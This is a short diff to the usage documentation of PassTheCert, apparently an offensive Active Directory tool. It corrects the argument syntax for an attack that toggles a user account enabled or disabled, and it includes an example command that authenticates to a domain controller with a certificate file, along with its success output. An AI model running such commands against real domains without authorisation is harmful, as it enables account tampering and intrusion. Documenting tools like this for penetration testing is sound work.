@@ -237,7 +237,7 @@ Success
 The options for this attack are:
 
 ```
-TOGGLE ENABLE USER ACCOUNT OPTIONS: --account ACCOUNT --toggle-enabled
+TOGGLE ENABLE USER ACCOUNT OPTIONS: --account ACCOUNT
         --account ACCOUNT
                 The account added enabled/disabled. Should be the distinguished name of the account.
         
@@ -245,7 +245,7 @@ TOGGLE ENABLE USER ACCOUNT OPTIONS: --account ACCOUNT --toggle-enabled
 
 Here's an example of usage:
 ```console
-C:\> .\PassTheCert.exe --server srv-ad.contoso.com --cert-path Z:\skywalker.pfx --account "CN=simple_user,CN=Users,DC=contoso,DC=com --toggle-enabled"
+C:\> .\PassTheCert.exe --server srv-ad.contoso.com --cert-path Z:\skywalker.pfx --toggle-enabled --account "CN=simple_user,CN=Users,DC=contoso,DC=com"
 Account status toggled. Result: Success
 
 ```
